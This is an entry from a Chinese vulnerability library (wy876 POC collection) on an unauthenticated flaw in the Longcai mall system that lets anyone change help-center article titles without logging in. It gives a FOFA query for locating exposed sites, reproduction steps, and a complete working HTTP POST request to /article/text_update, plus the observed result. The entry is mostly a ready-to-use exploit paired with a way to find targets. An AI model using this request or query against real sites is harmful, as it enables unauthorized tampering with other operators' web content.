---
fofa: "body="
source: "wy876 漏洞文库"
---

# 龙采商城系统存在未授权修改文章title

### 一、漏洞描述
龙采科技集团有限责任公司龙采商城系统后台未授权修改文章title，可直接无需登录后台后即可修改文章title。

### 二、影响版本
龙采商城系统

### 三、资产测绘
FOFA：body="'url':'/pc2.0/index/index'"

### 四、漏洞复现
<font style="color:black;background-color:#FFFFFF;">来到帮助中心，随机找一个分类标题，F12查看其article_id记录下来，替换掉POC里的id值，请求POC，更改data内容（建议以原来title内容+1作为区分，攻击后记得改回来），刷新页面发现标题已经被更改！</font>

```plain
POST /article/text_update HTTP/2
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 39

id=77&parameter=title&data=常见问题1
```


刷新以后发现已将"购物流程"修改为"常见问题1"


<font style="color:black;background-color:#f0f2f5;"></font>


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lvt3fs0uh5qmnvyc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
